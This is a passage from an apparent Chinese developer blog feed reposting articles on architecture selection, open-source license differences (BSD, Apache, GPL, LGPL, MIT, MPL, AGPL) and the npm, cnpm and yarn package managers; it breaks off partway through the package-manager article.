title="架构选型"></a>架构选型</h4><p>当你定位了问题，接下来就是调研各种架构模式。好消息是，有大量的架构模式可供选择；坏消息是，有大量的架构模式可供选择。事实上，大多数模式彼此之间都非常相似。<strong>所以这里的建议是，可以先对你需要使用的特定领域中的架构模式进行分类，把设计思想上比较类似的模式归为一类，然后着重了解每一类中最具代表性的一个。</strong></p><p>当你对这些架构模式有了一定了解后，就该做出选择了。老实说，你选择哪种模式并不重要，重要的是你如何将这种模式<strong>付诸实践</strong>。因为大多数模式只是触及到表层，没有细化到每一层的定义，选择“正确的”架构并不能让你自动获得良好架构的代码库。决定使用哪种模式的最佳方法是在代码库中<strong>多尝试几种模式</strong>，这将为你提供关于该模式是否能满足需求的最宝贵信息。另外也不要忽略人的因素，团队有多大？成员的开发经验如何？他们的偏好？是否有时间限制？这些都要考虑进去。这里有一些问题可以帮助你做尝试和选择：</p><ul><li>你最终会产出很多样板代码吗？如果是，它们是否至少让代码更容易读懂？</li><li>你最终会产出很多只是把方法调用代理到其他对象的“空”文件吗？</li><li>这个模式是否很难被理解？</li><li>你需要进行多少重构才能应用该模式？</li><li>这个模式是否添加了很多新概念和词汇？</li><li>你是否需要导入一个库来应用该模式？</li></ul><p>这些问题并不代表是坏事，它们只是帮助你去思考。最后请记住，架构设计与其说是科学，不如说是一门艺术。请不断去实践、学习和创新。有很多好的架构方法，也有很多不是那么好的方法，但没有所谓正确的方法。</p><h4 id="付诸实践"><a href="#付诸实践" class="headerlink" title="付诸实践"></a>付诸实践</h4><p>每个模式都有各自不同的设计思路和细节，如何进行实践，你就起了决定性作用。这里再重复一次最重要的事：这是一门艺术。所以请放开你的想象力，不断去尝试、总结和学习。当然，在实践过程中，有一些我们需要普遍关注的东西，这里罗列了一些：</p><ul><li><code>解耦</code> 不管你使用哪种模式，请确保你的代码被分解成小的、松耦合的片段。</li><li><code>内聚</code> 确保你的类型具有高内聚性。如果你定义的小类型具有非常专一的职责，那就可能表现出高度的凝聚力。</li><li><code>模块</code> 确保你的应用被分解成多个模块。</li><li><code>依赖</code> 确保你使用了类似依赖注入 (Dependency Injection)、服务定位 (Service Locators) 等这样的模式来管理对象之间的依赖关系。</li></ul><p>最后，愿架构之神保佑，让这些年轻的架构师，把自己的艺术生命绽放在代码上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一张图看懂开源许可协议，开源许可证GPL、BSD、MIT、Mozilla、Apache和LGPL的区别</title>
      <link href="/2022/06/03/%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%9C%8B%E6%87%82%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81GPL%E3%80%81BSD%E3%80%81MIT%E3%80%81Mozilla%E3%80%81Apache%E5%92%8CLGPL%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/06/03/%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%9C%8B%E6%87%82%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81GPL%E3%80%81BSD%E3%80%81MIT%E3%80%81Mozilla%E3%80%81Apache%E5%92%8CLGPL%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://blog.csdn.net/testcs_dn/article/details/38496107">一张图看懂开源许可协议，开源许可证GPL、BSD、MIT、Mozilla、Apache和LGPL的区别</a></p><p>首先借用有心人士的一张相当直观清晰的图来划分各种协议：开源许可证GPL、BSD、MIT、Mozilla、Apache和LGPL的区别<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d34da2c07a21392a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>以下是上述协议的简单介绍：</p><h4 id="BSD开源协议"><a href="#BSD开源协议" class="headerlink" title="BSD开源协议"></a>BSD开源协议</h4><p>BSD开源协议是一个给于使用者很大自由的协议。基本上使用者可以”为所欲为”,可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。</p><p>但”为所欲为”的前提当你发布使用了BSD协议的代码，或则以BSD协议代码为基础做二次开发自己的产品时，需要满足三个条件：</p><ul><li>如果再发布的产品中包含源代码，则在源代码中必须带有原来代码中的BSD协议。</li><li>如果再发布的只是二进制类库/软件，则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议。</li><li>不可以用开源代码的作者/机构名字和原来产品的名字做市场推广。</li></ul><p>BSD 代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。而很多的公司企业在选用开源产品的时候都首选BSD协议，因为可以完全控制这些第三方的代码，在必要的时候可以修改或者二次开发。</p><h4 id="Apache-Licence-2-0"><a href="#Apache-Licence-2-0" class="headerlink" title="Apache Licence 2.0"></a>Apache Licence 2.0</h4><p>Apache Licence是著名的非盈利开源组织Apache采用的协议。该协议和BSD类似，同样鼓励代码共享和尊重原作者的著作权，同样允许代码修改，再发布（作为开源或商业软件）。需要满足的条件也和BSD类似：</p><ul><li>需要给代码的用户一份Apache Licence</li><li>如果你修改了代码，需要再被修改的文件中说明。</li><li>在延伸的代码中（修改和有源代码衍生的代码中）需要带有原来代码中的协议，商标，专利声明和其他原来作者规定需要包含的说明。</li><li>如果再发布的产品中包含一个Notice文件，则在Notice文件中需要带有Apache Licence。你可以在Notice中增加自己的许可，但不可以表现为对Apache Licence构成更改。</li></ul><p>Apache Licence也是对商业应用友好的许可。使用者也可以在需要的时候修改代码来满足需要并作为开源或商业产品发布/销售。</p><h4 id="GPL"><a href="#GPL" class="headerlink" title="GPL"></a>GPL</h4><p>我们很熟悉的Linux就是采用了GPL。GPL协议和BSD, Apache Licence等鼓励代码重用的许可很不一样。GPL的出发点是代码的开源/免费使用和引用/修改/衍生代码的开源/免费使用，<code>但不允许修改后和衍生的代码做为闭源的商业软件发布和销售</code>。这也就是为什么我们能用免费的各种linux，包括商业公司的linux和linux上各种各样的由个人，组织，以及商业软件公司开发的免费软件了。</p><p>GPL协议的主要内容是只要在一个软件中使用(”使用”指类库引用，修改后的代码或者衍生代码)GPL 协议的产品，则该软件产品必须也采用GPL协议，既必须也是开源和免费。这就是所谓的”传染性”。GPL协议的产品作为一个单独的产品使用没有任何问题，还可以享受免费的优势。</p><p>由于GPL严格要求使用了GPL类库的软件产品必须使用GPL协议，对于使用GPL协议的开源代码，商业软件或者对代码有保密要求的部门就不适合集成/采用作为类库和二次开发的基础。</p><p>其它细节如再发布的时候需要伴随GPL协议等和BSD/Apache等类似。</p><h4 id="LGPL"><a href="#LGPL" class="headerlink" title="LGPL"></a>LGPL</h4><p>LGPL是GPL的一个为主要为类库使用设计的开源协议。和GPL要求任何使用/修改/衍生之GPL类库的的软件必须采用GPL协议不同。<code>LGPL 允许商业软件通过类库引用(link)方式使用LGPL类库而不需要开源商业软件的代码</code>。这使得采用LGPL协议的开源代码可以被商业软件作为类库引用并发布和销售。</p><p>但是如果修改LGPL协议的代码或者衍生，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用LGPL协议。因此LGPL协议的开源代码很适合作为第三方类库被商业软件引用，但不适合希望以LGPL协议代码为基础，通过修改和衍生的方式做二次开发的商业软件采用。</p><p>GPL/LGPL都保障原作者的知识产权，避免有人利用开源代码复制并开发类似的产品</p><h4 id="MIT"><a href="#MIT" class="headerlink" title="MIT"></a>MIT</h4><p>MIT是和BSD一样宽范的许可协议,作者只想保留版权,而无任何其他限制.也就是说,你必须在你的发行版里包含原许可协议的声明,无论你是以二进制发布的还是以源代码发布的.</p><h4 id="MPL"><a href="#MPL" class="headerlink" title="MPL"></a>MPL</h4><p>MPL是The Mozilla Public License的简写，是1998年初Netscape的 Mozilla小组为其开源软件项目设计的软件许可证。MPL许可证出现的最重要原因就是，Netscape公司认为GPL许可证没有很好地平衡开发者对源代码的需求和他们利用源代码获得的利益。同著名的GPL许可证和BSD许可证相比，MPL在许多权利与义务的约定方面与它们相同（因为都是符合OSIA 认定的开源软件许可证）。但是，相比而言MPL还有以下几个显著的不同之处:</p><p>◆ MPL虽然要求对于经MPL许可证发布的源代码的修改也要以MPL许可证的方式再许可出来，以保证其他人可以在MPL的条款下共享源代码。但是，在MPL 许可证中对“发布”的定义是“以源代码方式发布的文件”，<code>这就意味着MPL允许一个企业在自己已有的源代码库上加一个接口，除了接口程序的源代码以MPL 许可证的形式对外许可外，源代码库中的源代码就可以不用MPL许可证的方式强制对外许可</code>。这些，就为借鉴别人的源代码用做自己商业软件开发的行为留了一个豁口。<br>◆ MPL许可证第三条第7款中允许被许可人将经过MPL许可证获得的源代码同自己其他类型的代码混合得到自己的软件程序。<br>◆ 对软件专利的态度，MPL许可证不像GPL许可证那样明确表示反对软件专利，但是却明确要求源代码的提供者不能提供已经受专利保护的源代码（除非他本人是专利权人，并书面向公众免费许可这些源代码），也不能在将这些源代码以开放源代码许可证形式许可后再去申请与这些源代码有关的专利。<br>◆ 对源代码的定义<br>而在MPL（1.1版本）许可证中，对源代码的定义是:“源代码指的是对作品进行修改最优先择取的形式，它包括:所有模块的所有源程序，加上有关的接口的定义，加上控制可执行作品的安装和编译的‘原本’（原文为‘Script’），或者不是与初始源代码显著不同的源代码就是被源代码贡献者选择的从公共领域可以得到的程序代码。”<br>◆ MPL许可证第3条有专门的一款是关于对源代码修改进行描述的规定，就是要求所有再发布者都得有一个专门的文件就对源代码程序修改的时间和修改的方式有描述。</p><p>英文原文：<a href="http://www.mozilla.org/MPL/MPL-1.1.html">http://www.mozilla.org/MPL/MPL-1.1.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源许可证教程</title>
      <link href="/2022/06/03/%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E6%95%99%E7%A8%8B/"/>
      <url>/2022/06/03/%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.ruanyifeng.com/blog/2017/10/open-source-license-tutorial.html">开源许可证教程</a></p><p>作为一个开发者，如果你打算开源自己的代码，千万不要忘记，选择一种开源许可证（license）。</p><p>许多开发者对开源许可证了解很少，不清楚有哪些许可证，应该怎么选择。本文介绍开源许可证的基本知识，主要参考了 OpenSource.com （<a href="https://opensource.com/article/17/9/9-open-source-software-rules-startups">1</a>，<a href="https://opensource.com/article/17/9/open-source-licensing">2</a>）。</p><h1 id="一、什么是开源许可证"><a href="#一、什么是开源许可证" class="headerlink" title="一、什么是开源许可证"></a>一、什么是开源许可证</h1><p>开源许可证是一种法律许可。通过它，版权拥有人明确允许，用户可以免费地使用、修改、共享版权软件。</p><p>版权法默认禁止共享，也就是说，没有许可证的软件，就等同于保留版权，虽然开源了，用户只能看看源码，不能用，一用就会侵犯版权。所以软件开源的话，必须明确地授予用户开源许可证。</p><h1 id="二、开源许可证的种类"><a href="#二、开源许可证的种类" class="headerlink" title="二、开源许可证的种类"></a>二、开源许可证的种类</h1><p>目前，国际公认的开源许可证共有<a href="https://opensource.org/licenses/alphabetical">80多种</a>。它们的共同特征是，都允许用户免费地使用、修改、共享源码，但是都有各自的使用条件。</p><p>如果一种开源许可证没有任何使用条件，连保留作者信息都不需要，那么就等同于放弃版权了。这时，软件可以直接声明进入”公共领域”（public domain）。</p><p>根据使用条件的不同，开源许可证分成两大类。</p><blockquote><ul><li>宽松式（permissive）许可证</li><li>Copyleft 许可证</li></ul></blockquote><h1 id="三、宽松式许可证"><a href="#三、宽松式许可证" class="headerlink" title="三、宽松式许可证"></a>三、宽松式许可证</h1><h4 id="3-1-特点"><a href="#3-1-特点" class="headerlink" title="3.1 特点"></a>3.1 特点</h4><p>宽松式许可证（permissive license）是最基本的类型，对用户几乎没有限制。用户可以修改代码后闭源。</p><p>它有三个基本特点。</p><p><strong>（1）没有使用限制</strong></p><p>用户可以使用代码，做任何想做的事情。</p><p><strong>（2）没有担保</strong></p><p>不保证代码质量，用户自担风险。</p><p><strong>（3）披露要求（notice requirement）</strong></p><p>用户必须披露原始作者。</p><h4 id="3-2-常见许可证"><a href="#3-2-常见许可证" class="headerlink" title="3.2 常见许可证"></a>3.2 常见许可证</h4><p>常见的宽松式许可证有四种。它们都允许用户任意使用代码，区别在于要求用户遵守的条件不同。</p><p><strong>（1）BSD（二条款版）</strong></p><p>分发软件时，必须保留原始的许可证声明。</p><p><strong>（2） BSD（三条款版）</strong></p><p>分发软件时，必须保留原始的许可证声明。不得使用原始作者的名字为软件促销。</p><p><strong>（3）MIT</strong></p><p>分发软件时，必须保留原始的许可证声明，与 BSD（二条款版）基本一致。</p><p><strong>（4）Apache 2</strong></p><p>分发软件时，必须保留原始的许可证声明。凡是修改过的文件，必须向用户说明该文件修改过；没有修改过的文件，必须保持许可证不变。</p><h1 id="四、Copyleft-许可证"><a href="#四、Copyleft-许可证" class="headerlink" title="四、Copyleft 许可证"></a>四、Copyleft 许可证</h1><h3 id="4-1-Copyleft-的含义"><a href="#4-1-Copyleft-的含义" class="headerlink" title="4.1 Copyleft 的含义"></a>4.1 Copyleft 的含义</h3><p>Copyleft 是<a href="https://www.ruanyifeng.com/blog/2005/03/post_112.html">理查德·斯托曼</a>发明的一个词，作为 Copyright （版权）的反义词。</p><p>Copyright 直译是”复制权”，这是版权制度的核心，意为不经许可，用户无权复制。作为反义词，Copyleft 的含义是不经许可，用户可以随意复制。</p><p>但是，它带有前提条件，比宽松式许可证的限制要多。</p><blockquote><ul><li>如果分发二进制格式，必须提供源码</li><li>修改后的源码，必须与修改前保持许可证一致</li><li>不得在原始许可证以外，附加其他限制</li></ul></blockquote><p>上面三个条件的核心就是：修改后的 Copyleft 代码不得闭源。</p><h4 id="4-2-常见许可证"><a href="#4-2-常见许可证" class="headerlink" title="4.2 常见许可证"></a>4.2 常见许可证</h4><p>常见的 Copyleft 许可证也有四种（对用户的限制从最强到最弱排序）。</p><p><strong>（1）Affero GPL (AGPL)</strong></p><p>如果云服务（即 SAAS）用到的代码是该许可证，那么云服务的代码也必须开源。</p><p><strong>（2）GPL</strong></p><p>如果项目包含了 GPL 许可证的代码，那么整个项目都必须使用 GPL 许可证。</p><p><strong>（3）LGPL</strong></p><p>如果项目采用动态链接调用该许可证的库，项目可以不用开源。</p><p><strong>（4）Mozilla（MPL）</strong></p><p>只要该许可证的代码在单独的文件中，新增的其他文件可以不用开源。</p><h1 id="五、常见问题"><a href="#五、常见问题" class="headerlink" title="五、常见问题"></a>五、常见问题</h1><p>本节回答一些开源许可证的常见问题。</p><h4 id="5-1-什么叫分发（distribution）？"><a href="#5-1-什么叫分发（distribution）？" class="headerlink" title="5.1 什么叫分发（distribution）？"></a>5.1 什么叫分发（distribution）？</h4><p>除了 Affero GPL (AGPL) ，其他许可证都规定只有在”分发”时，才需要遵守许可证。换言之，如果不”分发”，就不需要遵守。</p><p>简单说，分发就是指将版权作品从一个人转移到另一个人。这意味着，如果你是自己使用，不提供给他人，就没有分发。另外，这里的”人”也指”法人”，因此如果使用方是公司，且只在公司内部使用，也不需要遵守许可证。</p><p>云服务（SaaS）是否构成”分发”呢？答案是不构成。所以你使用开源软件提供云服务，不必提供源码。但是，Affero GPL (AGPL) 许可证除外，它规定云服务也必须提供源码。</p><h4 id="5-2-开源软件的专利如何处理？"><a href="#5-2-开源软件的专利如何处理？" class="headerlink" title="5.2 开源软件的专利如何处理？"></a>5.2 开源软件的专利如何处理？</h4><p>某些许可证（Apache 2 和 GPL v3）包含明确的条款，授予用户许可，使用软件所包含的所有专利。</p><p>另一些许可证（BSD、MIT 和 GPL v2）根本没提到专利。但是一般认为，它们默认给予用户专利许可，不构成侵犯专利。</p><p>总得来说，除非有明确的”保留专利”的条款，使用开源软件都不会构成侵犯专利。</p><h4 id="5-3-什么是披露要求？"><a href="#5-3-什么是披露要求？" class="headerlink" title="5.3 什么是披露要求？"></a>5.3 什么是披露要求？</h4><p>所有的开源许可证都带有”披露要求”（notice requirement），即要求软件的分发者必须向用户披露，软件里面有开源代码。</p><p>一般来说，你只要在软件里面提供完整的原始许可证文本，并且披露原始作者，就满足了”披露要求”。</p><h4 id="5-4-GPL-病毒是真的吗？"><a href="#5-4-GPL-病毒是真的吗？" class="headerlink" title="5.4 GPL 病毒是真的吗？"></a>5.4 GPL 病毒是真的吗？</h4><p>GPL 许可证规定，只要你的项目包含了 GPL 代码，整个项目就都变成了 GPL。有人把这种传染性比喻成”GPL 病毒”。</p><p>很多公司希望避开这个条款，既使用 GPL 软件，又不把自己的专有代码开源。理论上，这是做不到的。因为 GPL 的设计目的，就是为了防止出现这种情况。</p><p>但是实际上，不遵守 GPL，最坏情况就是被起诉。如果你向法院表示无法履行 GPL 的条件，法官只会判决你停止使用 GPL 代码（法律上叫做”停止侵害”），而不会强制要求你将源码开源，因为《版权法》里面的”违约救济”没有提到违约者必须开源，只提到可以停止侵害和赔偿损失。<br>（完）</p><h3 id="文档信息"><a href="#文档信息" class="headerlink" title="文档信息"></a>文档信息</h3><ul><li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端核心工具：yarn、npm、cnpm三者如何优雅的在一起使用 ？</title>
      <link href="/2022/05/28/%E5%89%8D%E7%AB%AF%E6%A0%B8%E5%BF%83%E5%B7%A5%E5%85%B7%EF%BC%9Ayarn%E3%80%81npm%E3%80%81cnpm%E4%B8%89%E8%80%85%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E4%BD%BF%E7%94%A8-%EF%BC%9F/"/>
      <url>/2022/05/28/%E5%89%8D%E7%AB%AF%E6%A0%B8%E5%BF%83%E5%B7%A5%E5%85%B7%EF%BC%9Ayarn%E3%80%81npm%E3%80%81cnpm%E4%B8%89%E8%80%85%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E4%BD%BF%E7%94%A8-%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://segmentfault.com/a/1190000019299845">前端核心工具：yarn、npm、cnpm三者如何优雅的在一起使用 ？</a></p><p>一位用不好包管理器的前端，是一个入门级前端，一个用不好<code>webpack</code>的前端，是一个初级前端</p><p>三个包管理器是可以一起用的，只要你够胆大心细，就没任何问题！</p><ul><li><p>推荐两篇文章</p><ul><li><a href="https://segmentfault.com/a/1190000019126657">手写优化版React脚手架</a></li><li><a href="https://segmentfault.com/a/1190000019207033">手写Vue的脚手架</a></li><li><a href="https://segmentfault.com/a/1190000018827395">前端性能优化不完全手册</a></li></ul><p>在<code>javeScript</code>编写中,我们尽量不要定义全局变量，封装函数尽量不要有副作用,因为全部变量的查询时间会比局部变量的查询慢,更是考虑在<code>Node</code>的环境中无法被垃圾回收的问题</p></li></ul><h3 id="老规矩-先看原理"><a href="#老规矩-先看原理" class="headerlink" title="老规矩 先看原理"></a>老规矩 先看原理</h3><h4 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h4><ul><li><code>npm</code> 是 <code>Node.js</code> 能够如此成功的主要原因之一。<code>npm</code> 团队做了很多的工作，以确保 <code>npm</code> 保持向后兼容，并在不同的环境中保持一致。</li><li><code>npm</code>是围绕着 语义版本控制（semver）的思想而设计。</li><li>给定一个版本号：主版本号.次版本号.补丁版本号， 以下这三种情况需要增加相应的版本号：</li><li>主版本号： 当API发生改变，并与之前的版本不兼容的时候</li><li>次版本号： 当增加了功能，但是向后兼容的时候</li><li>补丁版本号：当做了向后兼容的缺陷修复的时候</li><li><code>npm 2</code> 会安装每一个包所依赖的所有依赖项。如果我们有这么一个项目，它依赖项目A，项目A依赖项目B，项目B依赖项目C，那么依赖树将如下所示：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ff0e925fc4221fd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>这个结构可能会很长。这对于基于Unix的操作系统来说只不过是一个小烦恼，但对于Windows来说却是个破坏性的东西，因为有很多程序无法处理超过260个字符的文件路径名。</li><li><code>npm 3</code>采用了扁平依赖关系树来解决这个问题，所以我们的3个项目结构现在看起来如下所示：</li></ul><p>存了已经下载的每个版本的压缩包。本地缓存的内容可以通过<code>npm cache ls</code>命令进行查看。本地缓存的设计有助于减少安装时间。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-33c913323dd0f552.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>这样，一个原来很长的文件路径名就从<code>./node_modules/package-A/node_modules/package-B/node-modules/some-file-name-in-package-c.js</code>变成了<code>/node_modules/some-file-name-in-package-c.js</code>。</li><li>这种方法的缺点是，<code>npm</code>必须首先遍历所有的项目依赖关系，然后再决定如何生成扁平的<code>node_modules</code>目录结构。<code>npm</code>必须为所有使用到的模块构建一个完整的依赖关系树，这是一个耗时的操作，是<code>npm</code>安装速度慢的一个很重要的原因。</li><li>想当然的以为每次运行<code>npm install</code>命令时，<code>NPM</code>都得从互联网上下载所有内容。</li><li>但是，<code>npm</code>是有本地缓存的，它保存了已经下载的每个版本的压缩包。本地缓存的内容可以通过<code>npm cache ls</code>命令进行查看。本地缓存的设计有助于减少安装时间。</li></ul><h4 id="cnpm"><a href="#cnpm" class="headerlink" title="cnpm"></a>cnpm</h4><p><code>cnpm</code>跟<code>npm</code>用法完全一致，只是在执行命令时将<code>npm</code>改为<code>cnpm</code>。<br><code>npm</code>安装插件是从国外服务器下载，受网络影响大，可能出现异常，如果<code>npm</code>的服务器在中国就好了，于是淘宝团队干了这事。来自官网：“这是一个完整 <code>npmjs.org</code> 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。”<br>官方地址：<code>http://npm.taobao.org</code><br>安装： <code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><h4 id="Yarn"><a href="#Yarn" class="headerlink" title="Yarn"></a>Yarn</h4><ul><li><code>Yarn</code>一开始的主要目标是解决上一节中描述的由于语义版本控制而导致的<code>npm</code>安装的不确定性问题。虽然可以使用<code>npm shrinkwrap</code>来实现可预测的依赖关系树，但它并不是默认选项，而是取决于所有的开发人员知道并且启用这个选项。</li><li><code>Yarn</code>采取了不同的做法。每个<code>yarn</code>安装都会生成一个类似于<code>npm-shrinkwrap.json</code>的<code>yarn.lock</code>文件，而且它是默认创建的。除了常规信息之外，<code>yarn.lock</code>文件还包含要安装的内容的校验和，以确保使用的库的版本相同。</li><li><code>yarn</code>是经过重新设计的崭新的<code>npm</code>客户端，它能让开发人员并行处理所有必须的操作，并添加了一些其他改进。</li><li>运行速度得到了显著的提升，整个安装时间也变得更少</li><li>像<code>npm</code>一样，<code>yarn</code>使用本地缓存。与<code>npm</code>不同的是，<code>yarn</code>无需互联网连接就能安装本地缓存的依赖项，它提供了离线模式。</li><li>允许合并项目中使用到的所有的包的许可证</li><li>通常情况下不建议通过<code>npm</code>进行安装。<code>npm</code>安装是非确定性的，程序包没有签名，并且<code>npm</code>除了做了基本的<code>SHA1</code>哈希之外不执行任何完整性检查，这给安装系统程序带来了安全风险。(作者曾经在一个上百个依赖包的项目中使用<code>npm</code>丢包过，代价非常大，泪水不自觉掉下来)<blockquote><p>首先看一次非常失败的包下载 竟然是从全局读取的资源(不配置<code>webpack</code>别名是因为就这一个路径这么长)</p></blockquote></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/15531792-936a9fcbd4f35058.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>首先我们从原理入手 ，我们使用 <code>npm init</code>, <code>yarn init</code> ,<code>cnpm init</code> 的时候 发生了什么 ？</p></blockquote><ul><li>生成<code>package.json</code>文件</li><li><code>json</code>文件内部声明初始的版本信息、作者信息等，如果你是需要上传到<code>npm</code>上作为命令行工具，应该配置<code>bin</code>等声明入口字段<blockquote><p>那么当我们使用<code>npm i</code> , <code>yarn add</code> ,<code>cnpm i</code> 操作时候会发生什么 ？</p></blockquote></li><li>首先会根据你的命令行后缀是否加了<code> -g</code> 或者<code>global</code>判断，下载的包是放在全局的环境，还是当前<code>package.json</code>文件对应的<code>node_module</code>文件夹目录下(这点尤其重要，有人出BUG，就是因为在用<code>npm </code>, <code>cnpm</code>时候没有注明添加的是全局依赖还是本地依赖，导致json文件上没有对应的包名，项目永远起不来)</li><li>然后根据你的指令<code>--save </code>或者<code>-D</code>、<code>--save -dev</code>判断是开发依赖还是线上依赖，其实这点在<code>yarn</code>上没有问题，因为<code>yarn</code>有自己的一套检查包完整性的机制，不会丢包，还会自动判断添加依赖，出<code>bug</code>一般是<code>cnpm</code>和<code>npm</code>，没有明确<code>-g</code>或者<code>--save</code>，<code>npm</code>只有检查程序员签名的机制，没有检查包完整性的机制，也不会自动添加依赖到<code>json</code>文件，那么就会出现丢包的假象，所以建议主要使用<code>yarn</code></li></ul><h4 id="yarn和npm对比"><a href="#yarn和npm对比" class="headerlink" title="yarn和npm对比"></a><code>yarn</code>和<code>npm</code>对比</h4><p><img src="https://upload-images.jianshu.io/upload_images/15531792-4060ca3cfed0f963.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h5 id="npm的缺点汇总："><a href="#npm的缺点汇总：" class="headerlink" title="npm的缺点汇总："></a><code>npm</code>的缺点汇总：</h5><ul><li>同一个项目，安装的时候无法保持一致性。由于<code>package.json</code>文件中版本号的特点，下面三个版本号在安装的时候代表不同的含义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;5.0.3&quot;,</span><br><span class="line">&quot;~5.0.3&quot;,</span><br><span class="line">&quot;^5.0.3&quot;</span><br></pre></td></tr></table></figure></li><li>“5.0.3”表示安装指定的5.0.3版本，“～5.0.3”表示安装5.0.X中最新的版本，“^5.0.3”表示安装5.X.X中最新的版本。这就麻烦了，常常会出现同一个项目，有的同事是OK的，有的同事会由于安装的版本不一致出现bug。</li><li>安装的时候，包会在同一时间下载和安装，中途某个时候，一个包抛出了一个错误，但是<code>npm</code>会继续下载和安装包。因为<code>npm</code>会把所有的日志输出到终端，有关错误包的错误信息就会在一大堆<code>npm</code>打印的警告中丢失掉，并且你甚至永远不会注意到实际发生的错误。</li></ul><h5 id="yarn的优点"><a href="#yarn的优点" class="headerlink" title="yarn的优点"></a><code>yarn</code>的优点</h5><ul><li><p>速度快 。速度快主要来自以下两个方面：</p></li><li><p>并行安装：无论 <code>npm</code> 还是 <code>Yarn</code> 在执行包的安装时，都会执行一系列任务。<code>npm</code> 是按照队列执行每个 <code>package</code>，也就是说必须要等到当前 <code>package</code> 安装完成之后，才能继续后面的安装。而 <code>Yarn</code> 是并行执行所有任务，提高了性能。</p></li><li><p>离线模式：<code>如果之前已经安装过一个软件包，用Yarn再次安装时之间从缓存中获取，就不用像npm那样再从网络下载了。</code></p></li><li><p>安装版本统一：为了防止拉取到不同的版本，<code>Yarn</code> 有一个锁定文件 (lock file) 记录了被确切安装上的模块的版本号。每次只要新增了一个模块，<code>Yarn</code> 就会创建（或更新）<code>yarn.lock</code> 这个文件。这么做就保证了，每一次拉取同一个项目依赖时，使用的都是一样的模块版本。<code>npm</code> 其实也有办法实现处处使用相同版本的 <code>packages</code>，但需要开发者执行 <code>npm shrinkwrap</code> 命令。这个命令将会生成一个锁定文件，在执行 <code>npm install</code> 的时候，该锁定文件会先被读取，和 <code>Yarn</code> 读取 <code>yarn.lock</code> 文件一个道理。<code>npm</code> 和 <code>Yarn</code> 两者的不同之处在于，<code>Yarn</code> 默认会生成这样的锁定文件，而 <code>npm</code> 要通过 <code>shrinkwrap </code>命令生成 <code>npm-shrinkwrap.json</code> 文件，只有当这个文件存在的时候，<code>packages</code> 版本信息才会被记录和更新。</p></li><li><p>更简洁的输出：<code>npm</code> 的输出信息比较冗长。在执行 <code>npm install &lt;package&gt;</code> 的时候，命令行里会不断地打印出所有被安装上的依赖。相比之下，<code>Yarn</code> 简洁太多：默认情况下，结合了 <code>emoji</code>直观且直接地打印出必要的信息，也提供了一些命令供开发者查询额外的安装信息。</p></li><li><p>多注册来源处理：所有的依赖包，不管他被不同的库间接关联引用多少次，安装这个包时，只会从一个注册来源去装，要么是 <code>npm</code> 要么是 <code>bower</code>, 防止出现混乱不一致。</p></li><li><p>更好的语义化： <code>yarn</code>改变了一些<code>npm</code>命令的名称，比如 <code>yarn add/remove</code>，感觉上比 <code>npm</code> 原本的 <code>install/uninstall</code> 要更清晰。</p></li></ul><blockquote><p>那不是标题党？ 说了<code>yarn</code>这么多优点，我们为什么还要<code>npm</code>呢？</p></blockquote><h5 id="你不用npm-publish-，你怎么上传包到npm-你不用cnpm，是下载不了一些包的"><a href="#你不用npm-publish-，你怎么上传包到npm-你不用cnpm，是下载不了一些包的" class="headerlink" title="你不用npm publish ，你怎么上传包到npm? 你不用cnpm，是下载不了一些包的"></a>你不用<code>npm publish</code> ，你怎么上传包到<code>npm</code>? 